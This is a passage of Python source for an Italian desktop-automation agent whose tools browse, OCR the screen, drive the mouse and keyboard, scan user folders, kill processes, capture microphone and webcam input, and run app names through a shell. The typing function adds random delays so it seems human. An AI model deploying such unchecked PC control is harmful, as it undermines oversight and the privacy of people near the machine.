        time.sleep(2.0)
        return f"Vivaldi avviato su: {target_url}"
    except Exception as e:
        return f"Errore avvio Vivaldi: {e}"

def search_and_learn(topic):
    """
    Cerca informazioni su un argomento per apprendere e memorizzare:
    1. Apre Vivaldi/Browser con la ricerca per mostrare la navigazione a schermo.
    2. Interroga le API web per riassumere il contenuto e lo salva nella memoria persistente RAG (SQLite).
    """
    topic_str = str(topic).strip()
    if not topic_str:
        return "Argomento di ricerca vuoto."
        
    terminal_log(f"Navigazione & Apprendimento: {topic_str}", Fore.CYAN)
    open_vivaldi(topic_str)
    
    learned = ""
    # 1. Prova API Wikipedia Italiana
    try:
        wiki_api_it = f"https://it.wikipedia.org/api/rest_v1/page/summary/{urllib.parse.quote(topic_str)}"
        r = requests.get(wiki_api_it, timeout=6, headers={"User-Agent": "SmartChaosAgent/1.0"})
        if r.status_code == 200:
            d = r.json()
            extract = d.get("extract", "")
            if extract:
                learned = f"CONOSCENZA APPRESA (Wikipedia IT - {topic_str}): {extract}"
    except Exception:
        pass
    
    # 2. Se non trovato, prova API Wikipedia Inglese
    if not learned:
        try:
            wiki_api_en = f"https://en.wikipedia.org/api/rest_v1/page/summary/{urllib.parse.quote(topic_str)}"
            r = requests.get(wiki_api_en, timeout=6, headers={"User-Agent": "SmartChaosAgent/1.0"})
            if r.status_code == 200:
                d = r.json()
                extract = d.get("extract", "")
                if extract:
                    learned = f"CONOSCENZA APPRESA (Wikipedia EN - {topic_str}): {extract}"
        except Exception:
            pass

    # 3. Se ancora non trovato, prova DuckDuckGo Instant Answer API
    if not learned:
        try:
            ddg_api = f"https://api.duckduckgo.com/?q={urllib.parse.quote(topic_str)}&format=json&no_html=1&skip_disambig=1"
            r = requests.get(ddg_api, timeout=6, headers={"User-Agent": "SmartChaosAgent/1.0"})
            if r.status_code == 200:
                d = r.json()
                abstract = d.get("AbstractText", "") or d.get("Heading", "")
                if abstract:
                    learned = f"CONOSCENZA APPRESA (DuckDuckGo - {topic_str}): {abstract}"
        except Exception:
            pass
            
    if not learned:
        learned = f"Navigato su '{topic_str}' tramite browser. Finestra aperta e memorizzata."
        
    agent_memory.store("KNOWLEDGE", learned)
    terminal_log(f"Memoria aggiornata con nuova conoscenza!", Fore.GREEN)
    return learned

def browse_and_read_page(query_or_url="tecnologia", scroll_steps=3):
    """
    Naviga come un essere umano:
    1. Apre la pagina nel browser Vivaldi o di sistema.
    2. Attende il caricamento ed esegue uno scroll progressivo verso il basso.
    3. Cattura screenshot temporanei, estrae il testo visibile a schermo e cancella subito i file per non occupare spazio.
    4. Salva la conoscenza acquisita nel database SQLite locale (AgentMemory).
    """
    target = str(query_or_url).strip()
    if not target:
        target = "ultime notizie tecnologia"
        
    terminal_log(f"Navigazione e lettura umana su: '{target}' ({scroll_steps} scroll)...", Fore.CYAN)
    open_vivaldi(target)
    time.sleep(3.0) # Attesa caricamento pagina

    extracted_texts = []
    
    # Se tesseract non e nel PATH, prova percorsi standard Windows
    tesseract_candidates = [
        r"C:\Program Files\Tesseract-OCR\tesseract.exe",
        r"C:\Program Files (x86)\Tesseract-OCR\tesseract.exe",
        os.path.expandvars(r"%LOCALAPPDATA%\Programs\Tesseract-OCR\tesseract.exe")
    ]
    for tc in tesseract_candidates:
        if os.path.exists(tc):
            pytesseract.pytesseract.tesseract_cmd = tc
            break

    for step in range(int(scroll_steps)):
        temp_pic = f"outputs/temp_read_{int(time.time())}_{step}.png"
        try:
            # Cattura screenshot temporaneo
            pyautogui.screenshot(temp_pic)
            
            # Estrae testo con OCR se disponibile
            try:
                txt = pytesseract.image_to_string(Image.open(temp_pic))
                clean_lines = [line.strip() for line in txt.split('\n') if len(line.strip()) > 15]
                if clean_lines:
                    extracted_texts.extend(clean_lines[:5])
            except Exception:
                pass
        except Exception:
            pass
        finally:
            # ELIMINAZIONE IMMEDIATA DEL FILE TEMPORANEO PER NON OCCUPARE SPAZIO
            if os.path.exists(temp_pic):
                try:
                    os.remove(temp_pic)
                except Exception:
                    pass

        # Scroll umano verso il basso
        with mouse_lock:
            try:
                pyautogui.scroll(-450)
            except Exception:
                pass
        time.sleep(1.2) # Pausa di lettura umana

    # Se l'OCR non ha estratto testo, interroga le API informative come fallback
    learned_content = " ".join(extracted_texts).strip()
    if not learned_content:
        learned_content = search_and_learn(target)
    else:
        learned_content = f"LETTURA PAGINA ({target}): " + learned_content[:300] + "..."
        agent_memory.store("PAGE_READ", learned_content)

    terminal_log(f"Lettura completata: {learned_content[:80]}...", Fore.GREEN)
    return learned_content

def ensure_ollama_alive():
    """Verifica lo stato del server locale Ollama e tenta di riavviarlo se non risponde."""
    try:
        r = requests.get("http://127.0.0.1:11434", timeout=2)
        if r.status_code == 200:
            return "Ollama Server: ATTIVO"
    except Exception:
        pass
    try:
        subprocess.Popen(["ollama", "serve"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(1.5)
        return "Ollama Server: Riavviato con successo"
    except Exception as e:
        return f"Ollama Server non disponibile: {e}"

def system_health_check():
    """Esegue un check di salute del sistema: CPU, memoria, Ollama e integrità DB."""
    diag = []
    # 1. Ollama status
    diag.append(ensure_ollama_alive())
    # 2. Risoluzione e schermo
    try:
        w, h = pyautogui.size()
        diag.append(f"Display: {w}x{h}")
    except Exception as e:
        diag.append(f"Display errore: {e}")
    # 3. Database memoria
    try:
        mems = len(agent_memory.retrieve_recent(10))
        diag.append(f"DB Memoria: OK ({mems} elementi recenti)")
    except Exception as e:
        diag.append(f"DB Memoria: Errore {e}")
    res = " | ".join(diag)
    terminal_log(f"Diagnosi Salute Sistema: {res}", Fore.CYAN)
    return res

def scroll_mouse(amount):
    """Scrolla la rotella del mouse (positivo per su, negativo per giù)."""
    with mouse_lock:
        try:
            pyautogui.scroll(int(amount))
            return f"Scroll eseguito: {amount}"
        except: return "Errore scroll mouse"

def volume_control(level):
    """Imposta il volume di sistema su Linux usando amixer."""
    try:
        # Comando standard per sistemi Linux con ALSA
        subprocess.run(["amixer", "set", "Master", f"{level}%"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return f"Volume di sistema: {level}%"
    except: return "Errore controllo volume (Verifica amixer)"

def mic_listen(duration=5):
    """Ascolta dal microfono e converte in testo usando Google Speech Recognition."""
    recognizer = sr.Recognizer()
    try:
        with sr.Microphone() as source:
            terminal_log(f"🎤 Ascolto periferica microfono ({duration}s)...", Fore.CYAN)
            # Riduce il rumore di fondo per una cattura più pulita
            recognizer.adjust_for_ambient_noise(source, duration=1)
            audio = recognizer.listen(source, timeout=duration, phrase_time_limit=duration)
            text = recognizer.recognize_google(audio, language="it-IT")
            return f"IL MICROFONO HA SENTITO: {text}"
    except sr.UnknownValueError:
        return "Microfono attivo ma non ho capito le parole."
    except sr.WaitTimeoutError:
        return "Silenzio assoluto rilevato."
    except Exception as e:
        return f"Periferica Microfono Errore: {e}"

def get_system_info():
    """Raccoglie informazioni hardware e software dettagliate."""
    try:
        import platform
        uname = platform.uname()
        info = f"OS: {uname.system} {uname.release} | Arch: {uname.machine} | Host: {uname.node}"
        try:
            with open('/proc/meminfo', 'r') as f:
                mem = f.readline().split()[1]
                info += f" | RAM Totale: {int(mem)//1024} MB"
        except: pass
        return info
    except: return "Impossibile recuperare info sistema."

def scan_pc_filesystem(target_path=None):
    """Esegue una scansione del file system, delle unita disco e delle cartelle principali del PC."""
    import shutil
    report = []
    terminal_log("Inizio scansione file system e unita disco del PC...", Fore.CYAN)
    
    # 1. Scansione Dischi / Unita di archiviazione
    drives = []
    if sys.platform == "win32":
        import string
        for letter in string.ascii_uppercase:
            drive_path = f"{letter}:\\"
            if os.path.exists(drive_path):
                try:
                    usage = shutil.disk_usage(drive_path)
                    total_gb = usage.total // (1024**3)
                    free_gb = usage.free // (1024**3)
                    used_gb = usage.used // (1024**3)
                    percent = int((usage.used / usage.total) * 100)
                    drives.append(f"Unita {letter}: {used_gb}/{total_gb} GB ({percent}% pieno, {free_gb} GB liberi)")
                except Exception:
                    drives.append(f"Unita {letter}: Rilevata")
    else:
        try:
            usage = shutil.disk_usage("/")
            total_gb = usage.total // (1024**3)
            free_gb = usage.free // (1024**3)
            drives.append(f"Root /: {total_gb} GB Totali, {free_gb} GB Liberi")
        except Exception:
            pass

    report.append(f"Dischi: {', '.join(drives) if drives else 'Nessuna unita rilevata'}")

    # 2. Scansione delle cartelle utente principali
    base_dirs = [
        os.path.expanduser("~/Desktop"),
        os.path.expanduser("~/Documents"),
        os.path.expanduser("~/Downloads")
    ]
    if target_path and os.path.exists(target_path):
        base_dirs.insert(0, target_path)

    folder_stats = []
    for d in base_dirs:
        if os.path.exists(d):
            try:
                files = [f for f in os.listdir(d) if os.path.isfile(os.path.join(d, f))]
                subdirs = [f for f in os.listdir(d) if os.path.isdir(os.path.join(d, f))]
                folder_stats.append(f"{os.path.basename(d)}: {len(files)} file, {len(subdirs)} cartelle")
            except Exception:
                pass
                
    report.append(f"Cartelle: {'; '.join(folder_stats)}")
    summary = " | ".join(report)
    agent_memory.store("PC_SCAN", summary)
    terminal_log(f"Scansione completata: {summary}", Fore.GREEN)
    return summary

def kill_process(name):
    """Termina forzatamente un processo."""
    try:
        subprocess.run(["pkill", "-f", name], check=True)
        return f"Processo '{name}' terminato."
    except: return f"Impossibile terminare '{name}'."

def system_update():
    """Avvia l'aggiornamento dei repository di sistema (Linux)."""
    terminal_log("🔄 Tentativo di aggiornamento repository...", Fore.YELLOW)
    try:
        # Tenta update non interattivo
        subprocess.run(["sudo", "-n", "apt-get", "update"], check=True)
        return "Repository aggiornati (apt update eseguito)."
    except:
        return "Update fallito: sudo richiede password o pacchetti bloccati."

def move_to_text(target_text):
    """Usa l'OCR per trovare la posizione di una parola a schermo e sposta il cursore mentale."""
    img_path = capture_screen()
    if not img_path: return "Errore visione: Screenshot fallito."
    
    try:
        # Configura percorso Tesseract se non impostato
        tesseract_candidates = [
            r"C:\Program Files\Tesseract-OCR\tesseract.exe",
            r"C:\Program Files (x86)\Tesseract-OCR\tesseract.exe",
            os.path.expandvars(r"%LOCALAPPDATA%\Programs\Tesseract-OCR\tesseract.exe")
        ]
        for tc in tesseract_candidates:
            if os.path.exists(tc):
                pytesseract.pytesseract.tesseract_cmd = tc
                break

        # Esegue l'OCR con dati posizionali
        with Image.open(img_path) as img:
            data = pytesseract.image_to_data(img, output_type=pytesseract.Output.DICT)
            
        for i, text in enumerate(data['text']):
            if target_text.lower() in text.lower() and text.strip() != "":
                x = data['left'][i] + data['width'][i] // 2
                y = data['top'][i] + data['height'][i] // 2
                move_mouse(x, y)
                return f"Testo '{target_text}' trovato a {x},{y}. Mouse puntato."
        return f"Testo '{target_text}' non trovato a video."
    except Exception as e:
        return f"Errore analisi immagine: {e}"

def vision_click(target_text):
    """Cerca un testo e se lo trova esegue un click immediato."""
    res = move_to_text(target_text)
    if "puntato" in res:
        click_res = click_mouse()
        return f"Vision Click su '{target_text}': {click_res}"
    return res


# ==============================================================================
# 🖊️ CONTROLLO SCRITTURA AVANZATO (TASTIERA COMPLETA)
# Funzioni per scrivere testo, controllare le finestre e automatizzare il PC
# ==============================================================================

def keyboard_write(text, interval=0.04):
    """
    Scrive testo carattere per carattere a velocità umana (simula digitazione vera).
    Usa delay casuali. Per gestire gli accenti su Windows, incolla il singolo carattere speciale.
    """
    try:
        import random
        with mouse_lock:
            for char in str(text):
                if sys.platform == "win32" and ord(char) > 127:
                    # Carattere speciale o accentato: usa clipboard per stamparlo
                    pyperclip.copy(char)
                    pyautogui.hotkey('ctrl', 'v')
                else:
                    # Carattere normale ASCII: digita come un umano
                    pyautogui.write(char)
                # Ritardo casuale per sembrare un umano (tra 0.02 e 0.1 secondi)
                time.sleep(random.uniform(0.02, 0.1))
        return f"Testo digitato a mano: {str(text)[:40]}"
    except Exception as e:
        return f"Errore scrittura avanzata: {e}"

def select_all():
    """Seleziona tutto il testo nel campo attivo (CTRL+A)."""
    with mouse_lock:
        try:
            pyautogui.hotkey('ctrl', 'a')
            return "Selezione totale eseguita (CTRL+A)"
        except Exception as e:
            return f"Errore select_all: {e}"

def copy_text_clipboard():
    """Copia il testo selezionato negli appunti (CTRL+C)."""
    with mouse_lock:
        try:
            pyautogui.hotkey('ctrl', 'c')
            time.sleep(0.15)
            copied = pyperclip.paste()
            return f"Copiato negli appunti: {str(copied)[:60]}"
        except Exception as e:
            return f"Errore copia: {e}"

def paste_from_clipboard():
    """Incolla il contenuto degli appunti (CTRL+V)."""
    with mouse_lock:
        try:
            pyautogui.hotkey('ctrl', 'v')
            return "Incollato dagli appunti (CTRL+V)"
        except Exception as e:
            return f"Errore incolla: {e}"

def cut_text_clipboard():
    """Taglia il testo selezionato (CTRL+X)."""
    with mouse_lock:
        try:
            pyautogui.hotkey('ctrl', 'x')
            return "Testo tagliato (CTRL+X)"
        except Exception as e:
            return f"Errore taglia: {e}"

def open_app(app_name):
    """
    Apre un'applicazione Windows per nome.
    Esempi: 'notepad', 'calc', 'mspaint', 'cmd', 'chrome', 'explorer', 'taskmgr'
    """
    app_name = str(app_name).strip()
    terminal_log(f"Apertura applicazione: {app_name}", Fore.CYAN)
    try:
        subprocess.Popen(app_name, shell=True)
        time.sleep(1.5)
        return f"Applicazione avviata: {app_name}"
    except Exception:
        pass
    try:
        with mouse_lock:
            pyautogui.hotkey('win', 'r')
        time.sleep(0.7)
        type_text(app_name)
        time.sleep(0.3)
        press_key('enter')
        time.sleep(1.5)
        return f"Applicazione aperta tramite Win+R: {app_name}"
    except Exception as e:
        return f"Errore apertura app: {e}"

def window_maximize():
    """Massimizza la finestra attiva (Win+Freccia Su)."""
    with mouse_lock:
        try:
            pyautogui.hotkey('win', 'up')
            time.sleep(0.3)
            return "Finestra massimizzata"
        except Exception as e:
            return f"Errore massimizzazione finestra: {e}"

def window_minimize():
    """Minimizza la finestra attiva (Win+Freccia Giu)."""
    with mouse_lock:
        try:
            pyautogui.hotkey('win', 'down')
            time.sleep(0.3)
            return "Finestra minimizzata"
        except Exception as e:
            return f"Errore minimizzazione finestra: {e}"

def window_close():
    """Chiude la finestra attiva (ALT+F4)."""
    with mouse_lock:
        try:
            pyautogui.hotkey('alt', 'f4')
            time.sleep(0.3)
            return "Finestra chiusa (ALT+F4)"
        except Exception as e:
            return f"Errore chiusura finestra: {e}"

def switch_window():
    """Passa alla finestra successiva (ALT+TAB)."""
    with mouse_lock:
        try:
            pyautogui.hotkey('alt', 'tab')
            time.sleep(0.5)
            return "Cambio finestra (ALT+TAB)"
        except Exception as e:
            return f"Errore cambio finestra: {e}"

def show_desktop():
    """Mostra il desktop (Win+D)."""
    with mouse_lock:
        try:
            pyautogui.hotkey('win', 'd')
            time.sleep(0.5)
            return "Desktop mostrato (Win+D)"
        except Exception as e:
            return f"Errore show_desktop: {e}"

def open_file_manager(path=""):
    """Apre Esplora File Windows su un percorso specifico o sulla radice."""
    path = str(path).strip()
    terminal_log(f"Apertura Esplora File: {path if path else 'Home'}", Fore.CYAN)
    try:
        if path and os.path.exists(path):
            subprocess.Popen(f'explorer "{path}"', shell=True)
        else:
            subprocess.Popen('explorer', shell=True)
        time.sleep(1.5)
        return f"Esplora file aperto: {path if path else 'Home'}"
    except Exception as e:
        return f"Errore apertura Esplora File: {e}"

def type_and_confirm(text):
    """Scrive del testo e preme INVIO per confermare (barre di ricerca e form)."""
    result = type_text(str(text))
    time.sleep(0.3)
    press_key('enter')
    return f"Scritto e confermato: {str(text)[:40]}"

def clipboard_set(text):
    """Imposta direttamente il contenuto degli appunti senza digitare."""
    try:
        pyperclip.copy(str(text))
        return f"Appunti impostati: {str(text)[:60]}"
    except Exception as e:
        return f"Errore clipboard_set: {e}"

def clipboard_get():
    """Legge il contenuto attuale degli appunti."""
    try:
        content = pyperclip.paste()
        return f"Contenuto appunti: {str(content)[:200]}"
    except Exception as e:
        return f"Errore lettura clipboard: {e}"

def take_screenshot_named(name="schermata"):
    """Scatta uno screenshot e lo salva con un nome leggibile."""
    if not os.path.exists("outputs"): os.makedirs("outputs")
    filename = f"outputs/{name}_{int(time.time())}.png"
    try:
        pyautogui.screenshot(filename)
        return f"Screenshot salvato: {filename}"
    except Exception as e:
        return f"Errore screenshot: {e}"

def read_screen_text():
    """Scatta uno screenshot e legge tutto il testo visibile via OCR."""
    img_path = capture_screen()
    if not img_path:
        return "Screenshot non riuscito"
    try:
        txt = pytesseract.image_to_string(Image.open(img_path))
        clean = " ".join([l.strip() for l in txt.split('\n') if len(l.strip()) > 5])
        if clean:
            agent_memory.store("SCREEN_READ", clean[:500])
        return f"TESTO A SCHERMO: {clean[:300]}"
    except Exception as e:
        return f"Errore lettura schermo OCR: {e}"
    finally:
        try:
            if img_path and os.path.exists(img_path):
                os.remove(img_path)
        except Exception:
            pass

# Registrazione nuovi tool nel ToolRegistry
agent_tools.register("keyboard_write", "Scrive testo a velocita umana simulando la tastiera fisica", {"text": "string testo", "interval": "optional float"})
agent_tools.register("select_all", "Seleziona tutto il testo (CTRL+A)", {})
agent_tools.register("copy", "Copia il testo selezionato negli appunti (CTRL+C)", {})
agent_tools.register("paste", "Incolla dagli appunti (CTRL+V)", {})
agent_tools.register("cut", "Taglia il testo selezionato (CTRL+X)", {})
agent_tools.register("open_app", "Apre un'applicazione Windows per nome (es. notepad, calc, chrome)", {"app_name": "string"})
agent_tools.register("window_maximize", "Massimizza la finestra attiva", {})
agent_tools.register("window_minimize", "Minimizza la finestra attiva", {})
agent_tools.register("window_close", "Chiude la finestra attiva (ALT+F4)", {})
agent_tools.register("switch_window", "Passa alla finestra successiva (ALT+TAB)", {})
agent_tools.register("show_desktop", "Mostra il desktop (Win+D)", {})
agent_tools.register("open_explorer", "Apre Esplora File Windows", {"path": "optional string"})
agent_tools.register("type_and_confirm", "Scrive testo e preme INVIO per confermare", {"text": "string"})
agent_tools.register("clipboard_set", "Imposta il contenuto degli appunti", {"text": "string"})
agent_tools.register("clipboard_get", "Legge il contenuto degli appunti", {})
agent_tools.register("screenshot", "Scatta e salva uno screenshot con nome", {"name": "optional string"})
agent_tools.register("read_screen", "Legge tutto il testo visibile a schermo tramite OCR", {})

# ==============================================================================
# 👁️ COMPUTER VISION AVANZATA (OpenCV + OCR + YOLO)
# Modulo di visione artificiale per vedere, analizzare e capire lo schermo in
# modo simile a come farebbe un essere umano: rileva oggetti, pulsanti, testo,
# cambiamenti e aree cliccabili usando OpenCV, pytesseract e YOLO.
# ==============================================================================

# Ultimo screenshot OpenCV salvato in memoria per il confronto cambiamenti
_last_cv_frame = None

def _screen_to_cv():
    """Cattura lo schermo e lo converte in un array NumPy BGR (formato OpenCV)."""
    try:
        import numpy as np
        screenshot = pyautogui.screenshot()
        frame = cv2.cvtColor(np.array(screenshot), cv2.COLOR_RGB2BGR)
        return frame
    except Exception as e:
        return None

def vision_analyze_screen():
    """
    Analisi visiva completa dello schermo con OpenCV:
    - Rileva colori dominanti
    - Calcola contrasto e luminosita media
    - Trova bordi e aree attive
    - Identifica regioni di interesse (ROI) da esplorare
    Restituisce un report testuale e lo memorizza nel DB.
    """
    global _last_cv_frame
    terminal_log("Analisi visiva avanzata dello schermo in corso...", Fore.MAGENTA)
    try:
        import numpy as np
        frame = _screen_to_cv()
        if frame is None:
            return "Errore: impossibile catturare lo schermo per l'analisi."

        _last_cv_frame = frame.copy()
        h, w = frame.shape[:2]

        # 1. Luminosita e contrasto media
        gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
        brightness = float(np.mean(gray))
        contrast = float(np.std(gray))

        # 2. Colori dominanti (analisi dei canali BGR)
        b_mean = float(np.mean(frame[:,:,0]))
        g_mean = float(np.mean(frame[:,:,1]))
        r_mean = float(np.mean(frame[:,:,2]))
        dominant = "rosso" if r_mean > g_mean and r_mean > b_mean else ("verde" if g_mean > b_mean else "blu")

        # 3. Rilevamento bordi (Canny) per identificare elementi UI
        edges = cv2.Canny(gray, 50, 150)
        edge_density = float(np.sum(edges > 0)) / (h * w) * 100

        # 4. Divisione schermo in quadranti e calcolo attivita
        quadrants = {
            "alto-sinistra":  gray[:h//2, :w//2],
            "alto-destra":    gray[:h//2, w//2:],
            "basso-sinistra": gray[h//2:, :w//2],
            "basso-destra":   gray[h//2:, w//2:]
        }
        q_report = []
        for name, q in quadrants.items():
            activity = float(np.std(q))
            q_report.append(f"{name}:{activity:.0f}")

        # 5. Trova rettangoli/pulsanti principali
        contours, _ = cv2.findContours(edges, cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)
        large_rects = []
        for cnt in contours:
            x_c, y_c, w_c, h_c = cv2.boundingRect(cnt)
            area = w_c * h_c
            if 2000 < area < 80000:  # aree medie = probabili pulsanti/finestre
                cx = x_c + w_c // 2
                cy = y_c + h_c // 2
                large_rects.append(f"({cx},{cy})")
        rect_info = f"{len(large_rects)} elementi UI rilevati" + (f" - principali: {', '.join(large_rects[:5])}" if large_rects else "")

        report = (
            f"ANALISI SCHERMO [{w}x{h}px]: "
            f"Luminosita={brightness:.0f}/255 | Contrasto={contrast:.0f} | "
            f"Colore dominante={dominant} | Densita bordi={edge_density:.1f}% | "
            f"Attivita quadranti=[{' | '.join(q_report)}] | "
            f"{rect_info}"
        )

        agent_memory.store("VISION_ANALYSIS", report)
        terminal_log(f"Visione: {report[:80]}...", Fore.MAGENTA)
        return report

    except Exception as e:
        return f"Errore analisi visiva: {e}"


def vision_find_buttons():
    """
    Usa OpenCV per trovare pulsanti, box e elementi rettangolari interattivi a schermo.
    Restituisce una lista di coordinate (x, y) dei centri degli elementi trovati.
    """
    terminal_log("Ricerca pulsanti e elementi interattivi a schermo...", Fore.MAGENTA)
    try:
        import numpy as np
        frame = _screen_to_cv()
        if frame is None:
            return "Errore screenshot per ricerca pulsanti."

        gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
        # Soglia adattiva per isolare elementi UI (funziona bene su sfondi chiari e scuri)
        thresh = cv2.adaptiveThreshold(gray, 255, cv2.ADAPTIVE_THRESH_GAUSSIAN_C, cv2.THRESH_BINARY_INV, 11, 2)
        # Dilatazione per unire parti vicine dello stesso pulsante
        kernel = cv2.getStructuringElement(cv2.MORPH_RECT, (5, 5))
        dilated = cv2.dilate(thresh, kernel, iterations=2)
        contours, _ = cv2.findContours(dilated, cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)

        buttons = []
        for cnt in sorted(contours, key=cv2.contourArea, reverse=True)[:15]:
            x_c, y_c, w_c, h_c = cv2.boundingRect(cnt)
            area = w_c * h_c
            aspect = w_c / max(h_c, 1)
            # Un pulsante tipico e largo 2-10x l'altezza, area media
            if 1500 < area < 100000 and 1.5 < aspect < 12:
                cx = x_c + w_c // 2
                cy = y_c + h_c // 2
                buttons.append({"x": cx, "y": cy, "w": w_c, "h": h_c})

        if not buttons:
            return "Nessun elemento interattivo rilevato a schermo."

        result = f"Trovati {len(buttons)} elementi UI: " + " | ".join([f"({b['x']},{b['y']}) {b['w']}x{b['h']}px" for b in buttons[:8]])
        agent_memory.store("VISION_BUTTONS", result)
        terminal_log(f"Pulsanti: {result[:80]}", Fore.MAGENTA)
        return result

    except Exception as e:
        return f"Errore rilevamento pulsanti: {e}"


def vision_detect_changes():
    """
    Confronta il frame corrente con l'ultimo salvato in memoria e rileva
    cosa e cambiato a schermo (es. nuove finestre, pop-up, cambi di stato).
    Restituisce le aree dove ci sono state variazioni.
    """
    global _last_cv_frame
    terminal_log("Rilevamento cambiamenti schermo...", Fore.MAGENTA)
    try:
        import numpy as np
        current = _screen_to_cv()
        if current is None:
            return "Errore: screenshot corrente fallito."

        if _last_cv_frame is None:
            _last_cv_frame = current.copy()
            return "Primo frame memorizzato. Al prossimo turno rilevo i cambiamenti."

        # Ridimensiona se necessario
        if current.shape != _last_cv_frame.shape:
            _last_cv_frame = cv2.resize(_last_cv_frame, (current.shape[1], current.shape[0]))

        # Differenza assoluta tra frame precedente e corrente
        diff = cv2.absdiff(_last_cv_frame, current)
        gray_diff = cv2.cvtColor(diff, cv2.COLOR_BGR2GRAY)
        _, thresh = cv2.threshold(gray_diff, 25, 255, cv2.THRESH_BINARY)

        # Trova aree cambiate
        contours, _ = cv2.findContours(thresh, cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)
        changed_areas = []
        total_changed_px = int(np.sum(thresh > 0))
        change_pct = total_changed_px / (current.shape[0] * current.shape[1]) * 100

        for cnt in sorted(contours, key=cv2.contourArea, reverse=True)[:5]:
            x_c, y_c, w_c, h_c = cv2.boundingRect(cnt)
            if w_c * h_c > 500:
                cx = x_c + w_c // 2
                cy = y_c + h_c // 2
                changed_areas.append(f"({cx},{cy})")

        _last_cv_frame = current.copy()

        if change_pct < 0.5:
            return f"Schermo stabile: cambiamento minimo ({change_pct:.2f}% pixel)"

        result = f"CAMBIAMENTO RILEVATO: {change_pct:.1f}% schermo modificato. Aree: {', '.join(changed_areas) if changed_areas else 'diffuse'}"
        agent_memory.store("VISION_CHANGE", result)
        terminal_log(result[:80], Fore.YELLOW)
        return result

    except Exception as e:
        return f"Errore rilevamento cambiamenti: {e}"


def vision_ocr_region(x=0, y=0, width=None, height=None):
    """
    Esegue OCR su una specifica regione rettangolare dello schermo.
    Utile per leggere testo in aree precise (es. titolo finestra, campo testo, barra stato).
    Parametri: x, y = angolo superiore sinistro; width, height = dimensioni (default = 1/4 schermo)
    """
    terminal_log(f"OCR regione schermo: ({x},{y}) {width}x{height}px", Fore.MAGENTA)
    try:
        import numpy as np
        sw, sh = pyautogui.size()
        x, y = int(x), int(y)
        w_r = int(width) if width else sw // 4
        h_r = int(height) if height else sh // 4

        # Cattura solo la regione richiesta
        region_img = pyautogui.screenshot(region=(x, y, w_r, h_r))
        # Converti in array numpy e scala a grigi
        np_img = __import__('numpy').array(region_img)
        gray_region = cv2.cvtColor(np_img, cv2.COLOR_RGB2GRAY)
        # Upscale 2x per migliorare accuratezza OCR
        upscaled = cv2.resize(gray_region, (w_r * 2, h_r * 2), interpolation=cv2.INTER_LANCZOS4)
        # Migliora contrasto con soglia di Otsu
        _, bin_region = cv2.threshold(upscaled, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
        pil_region = Image.fromarray(bin_region)
        txt = pytesseract.image_to_string(pil_region, lang='ita+eng')
        clean = " ".join([l.strip() for l in txt.split('\n') if len(l.strip()) > 3])
        result = f"TESTO REGIONE ({x},{y} {w_r}x{h_r}): {clean[:300]}"
        if clean:
            agent_memory.store("VISION_OCR_REGION", result)
        return result
    except Exception as e:
        # Fallback semplice
        try:
            import numpy as np
            region_img = pyautogui.screenshot(region=(x, y, int(width or 400), int(height or 300)))
            txt = pytesseract.image_to_string(region_img)
            clean = " ".join([l.strip() for l in txt.split('\n') if len(l.strip()) > 3])
            return f"TESTO REGIONE ({x},{y}): {clean[:300]}"
        except Exception as e2:
            return f"Errore OCR regione: {e2}"


def vision_smart_click(region="center"):
    """
    Analizza lo schermo e clicca automaticamente sul punto piu rilevante/attivo:
    - Se region='center': clicca al centro
    - Se region='button': trova il pulsante piu grande e ci clicca
    - Se region='bright': clicca sull'area piu luminosa (spesso testo/UI attiva)
    - Se region='changed': clicca sull'ultima area cambiata
    """
    terminal_log(f"Smart click su: {region}", Fore.MAGENTA)
    try:
        import numpy as np
        sw, sh = pyautogui.size()

        if region == "center":
            cx, cy = sw // 2, sh // 2
        elif region == "bright":
            frame = _screen_to_cv()
            if frame is not None:
                gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
                # Trova il pixel piu luminoso (potenziale UI attiva)
                min_val, max_val, min_loc, max_loc = cv2.minMaxLoc(gray)
                cx, cy = max_loc
            else:
                cx, cy = sw // 2, sh // 2
        elif region == "button":
            # Trova il pulsante piu grande
            frame = _screen_to_cv()
            if frame is not None:
                gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
                edges = cv2.Canny(gray, 50, 150)
                contours, _ = cv2.findContours(edges, cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)
                best = None
                best_area = 0
                for cnt in contours:
                    x_c, y_c, w_c, h_c = cv2.boundingRect(cnt)
                    area = w_c * h_c
                    aspect = w_c / max(h_c, 1)
                    if 3000 < area < 60000 and 2 < aspect < 10 and area > best_area:
                        best = (x_c + w_c // 2, y_c + h_c // 2)
                        best_area = area
                cx, cy = best if best else (sw // 2, sh // 2)
            else:
                cx, cy = sw // 2, sh // 2
        else:
            cx, cy = sw // 2, sh // 2

        result = click_mouse(cx, cy)
        return f"Smart click ({region}) su ({cx},{cy}): {result}"

    except Exception as e:
        return f"Errore smart click: {e}"


def webcam_analyze_objects():
    """
    Analizza il feed della webcam con YOLO (se disponibile) o OpenCV base:
    - Con YOLO: rileva oggetti, persone, oggetti, con bounding box e confidence
    - Fallback OpenCV: rileva volti con Haar Cascade
    Salva un frame annotato in outputs/ e memorizza nel DB.
    """
    terminal_log("Analisi webcam con Computer Vision...", Fore.MAGENTA)
    try:
        import numpy as np
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return "Webcam non disponibile o occupata."

        # Cattura qualche frame per la stabilizzazione
        for _ in range(5):
            ret, frame = cap.read()
        cap.release()

        if not ret or frame is None:
            return "Impossibile catturare frame dalla webcam."

        results_text = []
        os.makedirs("outputs", exist_ok=True)
        out_path = f"outputs/webcam_cv_{int(time.time())}.jpg"

        # --- YOLO Detection (se ultralytics e disponibile) ---
        if YOLO is not None:
            try:
                model_path = "yolov8n.pt"  # Scarica automaticamente se assente
                yolo_model = YOLO(model_path)
                yolo_results = yolo_model(frame, verbose=False)
                for r in yolo_results:
                    for box in r.boxes:
                        cls_id = int(box.cls[0])
                        conf = float(box.conf[0])
                        label = yolo_model.names[cls_id]
